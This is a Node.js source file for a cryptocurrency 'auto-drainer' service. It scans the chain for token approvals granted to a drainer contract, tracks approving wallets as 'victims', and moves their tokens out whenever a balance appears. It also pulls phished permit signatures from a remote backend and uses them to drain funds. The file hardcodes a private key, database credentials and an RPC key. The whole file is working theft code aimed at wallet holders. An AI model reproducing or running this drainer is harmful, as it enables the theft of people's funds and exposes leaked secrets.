import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { sepolia, baseSepolia } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import express from 'express';

const app = express();
const PORT = process.env.PORT || 3003;

// Configuration
const CHAINS = [
  {
    chain: sepolia,
    mainDrainer: '0x20641E48446ae5c2B325ECcE3a2AB7a83d834CD3',
    permitDrainer: '0x913589D36b41eB60E6B9B574DcAEEc38abd1176b',
    rpc: 'https://eth-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
  }
];

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://marvellouschibuike:Marvy247@cluster0.mongodb.net/drainkit?retryWrites=true&w=majority';
const PERMIT_BACKEND = 'https://dkback.onrender.com';

const PRIVATE_KEY = '0x8e4e0161ac8f367670394f767aabc24709cb1e3d4e9e6afe071b484859f1ac90';

const DRAINER_ABI = parseAbi([
  'function drainToken(address token, address victim) external'
]);

const PERMIT_DRAINER_ABI = parseAbi([
  'function drainWithPermit(address token, address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'
]);

const ERC20_ABI = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)'
]);

const account = privateKeyToAccount(PRIVATE_KEY);

// Track victims and their approved tokens
const trackedVictims = new Map(); // { victimAddress: Set<tokenAddress> }
const processedDrains = new Map(); // { drainId: timestamp }
const processedPermits = new Set(); // { permitId }

let stats = {
  totalDrained: 0,
  lastDrain: null,
  drainsByChain: {},
  trackedVictims: 0,
  permitsDrained: 0
};

async function monitorChain(config) {
  const { chain, mainDrainer, rpc } = config;
  
  const publicClient = createPublicClient({
    chain,
    transport: http(rpc)
  });

  const walletClient = createWalletClient({
    account,
    chain,
    transport: http(rpc)
  });

  console.log(`🔍 Monitoring ${chain.name}...`);

  while (true) {
    try {
      // Step 1: Find new approvals
      const currentBlock = await publicClient.getBlockNumber();
      const fromBlock = currentBlock > 9n ? currentBlock - 9n : 0n;

      const logs = await publicClient.getLogs({
        event: {
          type: 'event',
          name: 'Approval',
          inputs: [
            { type: 'address', indexed: true, name: 'owner' },
            { type: 'address', indexed: true, name: 'spender' },
            { type: 'uint256', indexed: false, name: 'value' }
          ]
        },
        args: {
          spender: mainDrainer
        },
        fromBlock,
        toBlock: currentBlock
      });

      // Track new victims
      for (const log of logs) {
        const { owner, value } = log.args;
        const token = log.address;

        if (value > 0n) {
          const victimKey = `${chain.id}-${owner}`;
          if (!trackedVictims.has(victimKey)) {
            trackedVictims.set(victimKey, new Set());
            stats.trackedVictims++;
          }
          trackedVictims.get(victimKey).add(token);
          console.log(`👁️ Tracking ${owner} for ${token} on ${chain.name}`);
        }
      }

      // Step 2: Check balances of all tracked victims
      for (const [victimKey, tokens] of trackedVictims.entries()) {
        const [chainId, victim] = victimKey.split('-');
        if (parseInt(chainId) !== chain.id) continue;

        for (const token of tokens) {
          const drainId = `${chain.id}-${token}-${victim}`;
          
          try {
            // Check if victim has balance
            const balance = await publicClient.readContract({
              address: token,
              abi: ERC20_ABI,
              functionName: 'balanceOf',
              args: [victim]
            });

            if (balance > 0n) {
              // Check if we already drained recently
              if (processedDrains.has(drainId)) {
                const drainTime = processedDrains.get(drainId);
                if (Date.now() - drainTime < 120000) { // 2 minute cooldown
                  continue;
                }
              }

              console.log(`\n💰 [${chain.name}] BALANCE DETECTED!`);
              console.log(`Token: ${token}`);
              console.log(`Victim: ${victim}`);
              console.log(`Balance: ${balance.toString()}`);
              
              try {
                console.log(`🚀 Attempting drain...`);
                const hash = await walletClient.writeContract({
                  address: mainDrainer,
                  abi: DRAINER_ABI,
                  functionName: 'drainToken',
                  args: [token, victim],
                  gas: 200000n
                });
                
                console.log(`📝 TX submitted: ${hash}`);
                
                // Wait for confirmation
                const receipt = await publicClient.waitForTransactionReceipt({ hash });
                
                if (receipt.status === 'success') {
                  console.log(`✅ DRAINED! TX: ${hash}`);
                  
                  processedDrains.set(drainId, Date.now());
                  stats.totalDrained++;
                  stats.lastDrain = new Date().toISOString();
                  stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
                  
                  console.log(`📊 Stats updated:`, JSON.stringify(stats));
                } else {
                  console.log(`❌ TX reverted: ${hash}`);
                }
                
              } catch (error) {
                console.error(`❌ Drain failed for ${victim}:`, error);
              }
            }
          } catch (error) {
            // Token might not exist or other error, skip
          }
        }
      }
      
    } catch (error) {
      console.error(`[${chain.name}] Error: ${error.message}`);
    }
    
    // Check every 60 seconds (balance monitoring)
    await new Promise(resolve => setTimeout(resolve, 60000));
  }
}

// Monitor permit signatures from backend
async function monitorPermits() {
  while (true) {
    try {
      const response = await fetch(`${PERMIT_BACKEND}/api/signatures`);
      
      if (!response.ok) {
        console.log(`⚠️ Backend returned ${response.status}, skipping...`);
        await new Promise(resolve => setTimeout(resolve, 60000));
        continue;
      }
      
      const signatures = await response.json();
      
      if (!Array.isArray(signatures) || signatures.length === 0) {
        await new Promise(resolve => setTimeout(resolve, 60000));
        continue;
      }
      
      for (const sig of signatures) {
        const owner = sig.owner || sig.victim; // Backend uses 'victim' field
        const value = sig.value || sig.amount; // Backend uses 'amount' field
        const permitId = `${sig.chainId}-${sig.token}-${owner}`;
        
        if (processedPermits.has(permitId)) continue;
        
        // Validate required fields
        if (!owner || !value || !sig.deadline || !sig.v || !sig.r || !sig.s) {
          console.log(`⚠️ Skipping incomplete signature for ${sig.token}`);
          continue;
        }
        
        console.log(`\n🔐 NEW PERMIT SIGNATURE DETECTED!`);
        console.log(`Token: ${sig.token}`);
        console.log(`Owner: ${owner}`);
        console.log(`Owner: ${sig.owner}`);
        
        const chainConfig = CHAINS.find(c => c.chain.id === sig.chainId);
        if (!chainConfig) continue;
        
        try {
          const walletClient = createWalletClient({
            account,
            chain: chainConfig.chain,
            transport: http(chainConfig.rpc)
          });
          
          console.log(`🚀 Executing permit drain...`);
          
          const hash = await walletClient.writeContract({
            address: chainConfig.permitDrainer,
            abi: PERMIT_DRAINER_ABI,
            functionName: 'drainWithPermit',
            args: [sig.token, owner, BigInt(value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
            gas: 300000n
          });
          
          console.log(`📝 TX submitted: ${hash}`);
          
          const publicClient = createPublicClient({
            chain: chainConfig.chain,
            transport: http(chainConfig.rpc)
          });
          
          const receipt = await publicClient.waitForTransactionReceipt({ hash });
          
          if (receipt.status === 'success') {
            console.log(`✅ PERMIT DRAINED! TX: ${hash}`);
            processedPermits.add(permitId);
            stats.permitsDrained++;
            stats.totalDrained++;
            stats.lastDrain = new Date().toISOString();
          }
        } catch (error) {
          console.error(`❌ Permit drain failed:`, error.message);
        }
      }
    } catch (error) {
      console.error(`❌ Permit monitoring error:`, error.message);
    }
    
    await new Promise(resolve => setTimeout(resolve, 60000)); // Check every 60s
  }
}

// Start monitoring all chains
console.log('🤖 ENHANCED AUTO-DRAINER STARTED');
console.log('✅ Monitors new approvals');
console.log('✅ Tracks victim balances');
console.log('✅ Auto-drains when tokens added');
console.log('✅ Monitors permit signatures');
console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));

CHAINS.forEach(config => {
  monitorChain(config).catch(console.error);
});

// Start permit monitoring
monitorPermits().catch(console.error);

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'running',
    uptime: process.uptime(),
    totalDrained: stats.totalDrained,
    lastDrain: stats.lastDrain,
    drainsByChain: stats.drainsByChain,
    trackedVictims: stats.trackedVictims,
    activeVictims: trackedVictims.size,
    permitsDrained: stats.permitsDrained
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', monitoring: CHAINS.map(c => c.chain.name) });
});

// Self-ping to keep Render awake
const SELF_URL = 'https://dkback-1.onrender.com/health';
function keepAwake() {
  setInterval(async () => {
    try {
      const response = await fetch(SELF_URL);
      console.log(`🏓 Self-ping: ${response.status} - ${new Date().toISOString()}`);
    } catch (error) {
      console.error('Self-ping failed:', error.message);
    }
  }, 10 * 60 * 1000); // Every 10 minutes
}

app.listen(PORT, () => {
  console.log(`🌐 Health endpoint running on port ${PORT}`);
  keepAwake();
  console.log('🏓 Self-ping enabled - staying awake every 10 minutes');
});

process.on('SIGTERM', () => {
  console.log('Shutting down...');
  process.exit(0);
});

